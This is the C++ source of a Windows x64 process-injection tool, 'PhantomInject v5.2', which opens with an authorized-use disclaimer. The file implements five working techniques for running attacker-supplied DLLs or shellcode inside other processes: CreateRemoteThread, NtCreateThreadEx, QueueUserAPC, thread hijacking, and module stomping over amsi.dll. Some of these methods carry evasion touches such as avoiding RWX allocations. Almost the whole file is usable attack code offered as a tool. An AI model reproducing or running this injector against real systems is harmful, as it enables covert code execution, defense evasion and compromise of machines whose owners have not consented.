/*
 * PhantomInject v5.2 — Windows x64 Process Injector
 * Part of PhantomShell v5.2
 *
 * AUTHORIZED USE ONLY. This tool is provided for legitimate security testing,
 * red team operations, and authorized penetration testing engagements.
 * Unauthorized use against systems you do not own or have explicit written
 * permission to test is illegal and unethical. The authors assume no liability.
 */
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <string>
#include <vector>
#include "../common/ntapi.h"
#include "../common/utils.h"
#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "advapi32.lib")

typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID,
    ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);

#define FAIL(msg, ...) do { printf("[-] " msg "\n", ##__VA_ARGS__); } while(0)

// Find a process by name (case-insensitive), return PID or 0
DWORD FindProcessByName(const std::string& name) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) { FAIL("CreateToolhelp32Snapshot: %lu", GetLastError()); return 0; }
    PROCESSENTRY32 pe{}; pe.dwSize = sizeof(pe);
    if (!Process32First(hSnap, &pe)) { CloseHandle(hSnap); return 0; }
    do {
        if (_stricmp(pe.szExeFile, name.c_str()) == 0) {
            DWORD pid = pe.th32ProcessID; CloseHandle(hSnap);
            printf("[+] Found '%s' PID %lu\n", name.c_str(), pid);
            return pid;
        }
    } while (Process32Next(hSnap, &pe));
    CloseHandle(hSnap);
    FAIL("Process '%s' not found", name.c_str());
    return 0;
}

// Validate target is a native 64-bit process (reject WOW64)
bool ValidateTarget(DWORD pid) {
    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProc) { FAIL("Cannot open PID %lu: %lu", pid, GetLastError()); return false; }
    BOOL isWow64 = FALSE;
    if (!IsWow64Process(hProc, &isWow64)) { FAIL("IsWow64Process: %lu", GetLastError()); CloseHandle(hProc); return false; }
    CloseHandle(hProc);
    if (isWow64) { FAIL("PID %lu is WOW64 (32-bit) — x64 shellcode incompatible", pid); return false; }
    printf("[+] PID %lu validated as native x64\n", pid);
    return true;
}

// Load raw shellcode bytes from a file
static std::vector<BYTE> ReadShellcodeFile(const std::string& path) {
    HANDLE hFile = CreateFileA(path.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) { FAIL("Cannot open '%s': %lu", path.c_str(), GetLastError()); return {}; }
    DWORD size = GetFileSize(hFile, nullptr);
    std::vector<BYTE> buf(size); DWORD rd = 0;
    ReadFile(hFile, buf.data(), size, &rd, nullptr); CloseHandle(hFile);
    if (rd != size) { FAIL("Read mismatch: expected %lu got %lu", size, rd); return {}; }
    printf("[+] Loaded %lu bytes shellcode from '%s'\n", size, path.c_str());
    return buf;
}

// === Method 1: CreateRemoteThread DLL Injection ===
bool MethodCreateRemoteThread(DWORD pid, const std::string& dllPath) {
    printf("[*] Method 1: CreateRemoteThread DLL Injection\n");
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) { FAIL("OpenProcess: %lu", GetLastError()); return false; }
    SIZE_T len = dllPath.size() + 1;
    LPVOID rem = VirtualAllocEx(hProc, nullptr, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!rem) { FAIL("VirtualAllocEx: %lu", GetLastError()); CloseHandle(hProc); return false; }
    if (!WriteProcessMemory(hProc, rem, dllPath.c_str(), len, nullptr)) {
        FAIL("WriteProcessMemory: %lu", GetLastError()); VirtualFreeEx(hProc, rem, 0, MEM_RELEASE); CloseHandle(hProc); return false;
    }
    // LoadLibraryA address is identical across processes (ASLR is per-boot)
    FARPROC pLL = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    if (!pLL) { FAIL("Resolve LoadLibraryA: %lu", GetLastError()); VirtualFreeEx(hProc, rem, 0, MEM_RELEASE); CloseHandle(hProc); return false; }
    HANDLE hT = CreateRemoteThread(hProc, nullptr, 0, (LPTHREAD_START_ROUTINE)pLL, rem, 0, nullptr);
    if (!hT) { FAIL("CreateRemoteThread: %lu", GetLastError()); VirtualFreeEx(hProc, rem, 0, MEM_RELEASE); CloseHandle(hProc); return false; }
    printf("[+] Thread created, waiting for DLL load...\n");
    WaitForSingleObject(hT, 5000);
    CloseHandle(hT); VirtualFreeEx(hProc, rem, 0, MEM_RELEASE); CloseHandle(hProc);
    printf("[+] CreateRemoteThread DLL injection complete\n");
    return true;
}

// === Method 2: NtCreateThreadEx Shellcode Injection ===
bool MethodNtCreateThreadEx(DWORD pid, const std::vector<BYTE>& sc) {
    printf("[*] Method 2: NtCreateThreadEx Shellcode Injection\n");
    auto pNtCTE = (pNtCreateThreadEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");
    if (!pNtCTE) { FAIL("Cannot resolve NtCreateThreadEx"); return false; }
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) { FAIL("OpenProcess: %lu", GetLastError()); return false; }
    // Alloc RW -> write -> flip RX (avoids single RWX allocation)
    LPVOID rem = VirtualAllocEx(hProc, nullptr, sc.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!rem) { FAIL("VirtualAllocEx: %lu", GetLastError()); CloseHandle(hProc); return false; }
    if (!WriteProcessMemory(hProc, rem, sc.data(), sc.size(), nullptr)) {
        FAIL("WriteProcessMemory: %lu", GetLastError()); VirtualFreeEx(hProc, rem, 0, MEM_RELEASE); CloseHandle(hProc); return false;
    }
    DWORD oldProt = 0;
    if (!VirtualProtectEx(hProc, rem, sc.size(), PAGE_EXECUTE_READ, &oldProt)) {
        FAIL("VirtualProtectEx RW->RX: %lu", GetLastError()); VirtualFreeEx(hProc, rem, 0, MEM_RELEASE); CloseHandle(hProc); return false;
    }
    HANDLE hT = nullptr;
    NTSTATUS st = pNtCTE(&hT, THREAD_ALL_ACCESS, nullptr, hProc, rem, nullptr, 0, 0, 0, 0, nullptr);
    if (st != 0) { FAIL("NtCreateThreadEx NTSTATUS 0x%08lX", st); VirtualFreeEx(hProc, rem, 0, MEM_RELEASE); CloseHandle(hProc); return false; }
    printf("[+] Thread created via NtCreateThreadEx, waiting...\n");
    WaitForSingleObject(hT, 5000);
    CloseHandle(hT); CloseHandle(hProc);
    printf("[+] NtCreateThreadEx injection complete\n");
    return true;
}

// === Method 3: QueueUserAPC Injection ===
bool MethodQueueUserAPC(DWORD pid, const std::vector<BYTE>& sc) {
    printf("[*] Method 3: QueueUserAPC Injection\n");
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) { FAIL("OpenProcess: %lu", GetLastError()); return false; }
    LPVOID rem = VirtualAllocEx(hProc, nullptr, sc.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!rem) { FAIL("VirtualAllocEx: %lu", GetLastError()); CloseHandle(hProc); return false; }
    if (!WriteProcessMemory(hProc, rem, sc.data(), sc.size(), nullptr)) {
        FAIL("WriteProcessMemory: %lu", GetLastError()); VirtualFreeEx(hProc, rem, 0, MEM_RELEASE); CloseHandle(hProc); return false;
    }
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnap == INVALID_HANDLE_VALUE) {
        FAIL("Thread snapshot: %lu", GetLastError()); VirtualFreeEx(hProc, rem, 0, MEM_RELEASE); CloseHandle(hProc); return false;
    }
    THREADENTRY32 te{}; te.dwSize = sizeof(te);
    int queued = 0;
    if (Thread32First(hSnap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                HANDLE hT = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
                if (hT) { if (QueueUserAPC((PAPCFUNC)rem, hT, 0)) queued++; CloseHandle(hT); }
            }
        } while (Thread32Next(hSnap, &te));
    }
    CloseHandle(hSnap); CloseHandle(hProc);
    printf("[+] APC queued on %d thread(s) — runs on alertable wait\n", queued);
    return queued > 0;
}

// === Method 4: Thread Hijacking ===
bool MethodThreadHijack(DWORD pid, const std::vector<BYTE>& sc) {
    printf("[*] Method 4: Thread Hijacking (suspend / redirect RIP / resume)\n");
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) { FAIL("OpenProcess: %lu", GetLastError()); return false; }
    LPVOID rem = VirtualAllocEx(hProc, nullptr, sc.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
    if (!rem) { FAIL("VirtualAllocEx: %lu", GetLastError()); CloseHandle(hProc); return false; }
    if (!WriteProcessMemory(hProc, rem, sc.data(), sc.size(), nullptr)) {
        FAIL("WriteProcessMemory: %lu", GetLastError()); VirtualFreeEx(hProc, rem, 0, MEM_RELEASE); CloseHandle(hProc); return false;
    }
    // Find first thread of target
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnap == INVALID_HANDLE_VALUE) { FAIL("Thread snapshot: %lu", GetLastError()); CloseHandle(hProc); return false; }
    THREADENTRY32 te{}; te.dwSize = sizeof(te); DWORD tid = 0;
    if (Thread32First(hSnap, &te)) { do { if (te.th32OwnerProcessID == pid) { tid = te.th32ThreadID; break; } } while (Thread32Next(hSnap, &te)); }
    CloseHandle(hSnap);
    if (!tid) { FAIL("No threads for PID %lu", pid); CloseHandle(hProc); return false; }
    HANDLE hT = OpenThread(THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT, FALSE, tid);
    if (!hT) { FAIL("OpenThread(%lu): %lu", tid, GetLastError()); CloseHandle(hProc); return false; }
    SuspendThread(hT);
    printf("[+] Thread %lu suspended\n", tid);
    CONTEXT ctx{}; ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(hT, &ctx)) { FAIL("GetThreadContext: %lu", GetLastError()); ResumeThread(hT); CloseHandle(hT); CloseHandle(hProc); return false; }
    printf("[+] Original RIP: 0x%016llX\n", (unsigned long long)ctx.Rip);
    ctx.Rip = (DWORD64)rem;
    if (!SetThreadContext(hT, &ctx)) { FAIL("SetThreadContext: %lu", GetLastError()); ResumeThread(hT); CloseHandle(hT); CloseHandle(hProc); return false; }
    printf("[+] RIP -> 0x%p, resuming\n", rem);
    ResumeThread(hT);
    CloseHandle(hT); CloseHandle(hProc);
    printf("[+] Thread hijack complete\n");
    return true;
}

// === Method 5: Module Stomping ===
bool MethodModuleStomp(DWORD pid, const std::vector<BYTE>& sc) {
    printf("[*] Method 5: Module Stomping (overwrite .text of sacrificial DLL)\n");
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) { FAIL("OpenProcess: %lu", GetLastError()); return false; }
    // Force-load a benign DLL into target via LoadLibraryA
    const char* sacDll = "amsi.dll";
    SIZE_T pLen = strlen(sacDll) + 1;
    LPVOID pBuf = VirtualAllocEx(hProc, nullptr, pLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pBuf) { FAIL("VirtualAllocEx path: %lu", GetLastError()); CloseHandle(hProc); return false; }
    WriteProcessMemory(hProc, pBuf, sacDll, pLen, nullptr);
    FARPROC pLL = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    HANDLE hLT = CreateRemoteThread(hProc, nullptr, 0, (LPTHREAD_START_ROUTINE)pLL, pBuf, 0, nullptr);
    if (!hLT) { FAIL("CRT(LoadLibrary): %lu", GetLastError()); VirtualFreeEx(hProc, pBuf, 0, MEM_RELEASE); CloseHandle(hProc); return false; }
    WaitForSingleObject(hLT, 5000); CloseHandle(hLT); VirtualFreeEx(hProc, pBuf, 0, MEM_RELEASE);
    printf("[+] '%s' loaded into target\n", sacDll);
    // Find the module base address
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
    if (hSnap == INVALID_HANDLE_VALUE) { FAIL("Module snapshot: %lu", GetLastError()); CloseHandle(hProc); return false; }
    MODULEENTRY32 me{}; me.dwSize = sizeof(me); BYTE* modBase = nullptr;
    if (Module32First(hSnap, &me)) {
        do { if (_stricmp(me.szModule, sacDll) == 0) { modBase = me.modBaseAddr; printf("[+] '%s' at 0x%p (%lu bytes)\n", sacDll, modBase, me.modBaseSize); break; } } while (Module32Next(hSnap, &me));
    }
    CloseHandle(hSnap);
    if (!modBase) { FAIL("'%s' not found in modules", sacDll); CloseHandle(hProc); return false; }
    // Overwrite .text at base+0x1000 (skip PE headers)
    BYTE* dst = modBase + 0x1000;
    DWORD oldProt = 0;
    if (!VirtualProtectEx(hProc, dst, sc.size(), PAGE_EXECUTE_READWRITE, &oldProt)) { FAIL("VProtectEx .text: %lu", GetLastError()); CloseHandle(hProc); return false; }
    if (!WriteProcessMemory(hProc, dst, sc.data(), sc.size(), nullptr)) { FAIL("WPM .text: %lu", GetLastError()); CloseHandle(hProc); return false; }
    printf("[+] Shellcode written at 0x%p\n", dst);
    HANDLE hT = CreateRemoteThread(hProc, nullptr, 0, (LPTHREAD_START_ROUTINE)dst, nullptr, 0, nullptr);
    if (!hT) { FAIL("CRT(exec): %lu", GetLastError()); CloseHandle(hProc); return false; }
    printf("[+] Execution thread started\n");
    WaitForSingleObject(hT, 5000);
    CloseHandle(hT); CloseHandle(hProc);
    printf("[+] Module stomping complete\n");
    return true;
}

// === Entry point ===
int main(int argc, char* argv[]) {
    printf("=========================================\n");
    printf("[*] PhantomInject v5.2 -- Process Injector\n");
    printf("=========================================\n\n");
    int method = 0;
    std::string target, dllPath, scPath;
    for (int i = 1; i < argc; i++) {
        std::string a = argv[i];
        if      (a == "-m" && i+1 < argc) method  = atoi(argv[++i]);
        else if (a == "-p" && i+1 < argc) target  = argv[++i];
        else if (a == "-d" && i+1 < argc) dllPath = argv[++i];
        else if (a == "-s" && i+1 < argc) scPath  = argv[++i];
    }
    if (method < 1 || method > 5 || target.empty()) {
        printf("Usage: inject.exe -m <1-5> -p <pid|name> [-d dll] [-s shellcode]\n\n");
        printf("  1  CreateRemoteThread DLL   (-d)    4  Thread Hijacking     (-s)\n");
        printf("  2  NtCreateThreadEx SC      (-s)    5  Module Stomping      (-s)\n");
        printf("  3  QueueUserAPC SC          (-s)\n");
        return 1;
    }
    if (dllPath.empty() && scPath.empty()) { FAIL("Provide -d <dll_path> or -s <shellcode_file>"); return 1; }
    // Resolve target: numeric = PID, otherwise process name lookup
    DWORD pid = 0;
    bool numeric = !target.empty();
    for (char c : target) if (!isdigit((unsigned char)c)) { numeric = false; break; }
    if (numeric) { pid = (DWORD)strtoul(target.c_str(), nullptr, 10); printf("[*] Target PID: %lu\n", pid); }
    else { pid = FindProcessByName(target); if (!pid) return 1; }
    if (!ValidateTarget(pid)) return 1;
    std::vector<BYTE> sc;
    if (!scPath.empty()) { sc = ReadShellcodeFile(scPath); if (sc.empty()) return 1; }
    bool ok = false;
    switch (method) {
        case 1: if (dllPath.empty()) { FAIL("Method 1 requires -d"); return 1; } ok = MethodCreateRemoteThread(pid, dllPath); break;
        case 2: if (sc.empty()) { FAIL("Method 2 requires -s"); return 1; } ok = MethodNtCreateThreadEx(pid, sc); break;
        case 3: if (sc.empty()) { FAIL("Method 3 requires -s"); return 1; } ok = MethodQueueUserAPC(pid, sc); break;
        case 4: if (sc.empty()) { FAIL("Method 4 requires -s"); return 1; } ok = MethodThreadHijack(pid, sc); break;
        case 5: if (sc.empty()) { FAIL("Method 5 requires -s"); return 1; } ok = MethodModuleStomp(pid, sc); break;
        default: FAIL("Invalid method"); return 1;
    }
    printf("\n[%s] Injection %s\n", ok ? "+" : "-", ok ? "succeeded" : "failed");
    return ok ? 0 : 1;
}
